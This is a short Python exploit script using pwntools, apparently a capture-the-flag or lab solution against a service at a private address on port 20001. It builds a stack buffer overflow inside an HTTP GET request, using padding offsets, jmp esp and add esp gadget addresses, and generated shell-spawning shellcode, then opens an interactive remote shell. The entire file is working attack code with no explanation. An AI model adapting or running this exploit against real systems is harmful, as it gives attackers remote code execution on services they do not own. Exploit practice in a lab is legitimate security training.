from pwn import *
HOST = "192.168.246.145"
PORT = 20001
p = remote(HOST,PORT)

offset = 139
add_esp = 0x0804905f
jmp_esp = 0x08049f4f


esp = 0xbff6c8fc
esi = 0xbff6c9b5
offset2 = esp-esi+0x4+0x230
shellcode = asm(shellcraft.sh())

payload = flat(
    "GET /",
    "A"*offset,
    add_esp,
    " HTTP/1.1",
    "B"*offset2,
    "C"*12,
    jmp_esp,
    shellcode
)

p.sendline(payload)
print(p.clean().decode('latin-1'))

p.interactive()
